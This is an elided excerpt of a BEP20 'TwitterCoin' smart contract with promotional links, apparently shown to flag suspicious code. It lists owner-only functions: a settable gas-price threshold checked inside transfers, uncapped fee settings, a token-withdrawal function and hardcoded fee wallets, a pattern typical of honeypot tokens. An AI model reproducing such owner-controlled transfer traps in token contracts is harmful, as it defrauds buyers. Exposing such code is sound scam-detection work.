...
https://twitter.com/TWTYCOIN
https://t.me/Twitter_Coin_BSC


https://twitter.com/CoinHubCC/status/1628467883926863876?s=20
...
contract TwitterCoin is Ownable, IBEP20 {
    ...
    uint256 public maxfuel = 21 * 1 gwei;
    ...
    constructor () {
        ...
        autoLiquidityReceiver = 0xBb6E3F14c54B70bB8521f850DF9b850611331585;
        marketingFeeReceiver = 0x3a98791748799Ec8A6A4cE4ef23904baF476438e;
        devFeeReceiver = 0xBb6E3F14c54B70bB8521f850DF9b850611331585;
    ...
    function updateMaxholding(uint256 maxWallPercent_base1000) external onlyOwner {
        require(maxWallPercent_base1000 >= 1,"Cannot set max holding less than 0.1%");
    ...
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        ...
        if (tx.gasprice >= maxfuel && recipient != pair) {
    ...
    function removeForeignBEP20(address tokenAddress, uint256 tokens) public onlyOwner returns (bool) {
     if(tokens == 0){
    ...
    function setFuel (uint256 _maxfuel) public onlyOwner {
               maxfuel = _maxfuel * 1 gwei; 
    ...
    function setAllocation(uint256 _liquidityFee, uint256 _teamFee, uint256 _marketingFee, uint256 _devFee, uint256 _burnFee, uint256 _feeDenominator) external onlyOwner {
    ...
    function setTargetPercentage(uint256 _target, uint256 _denominator) external onlyOwner {
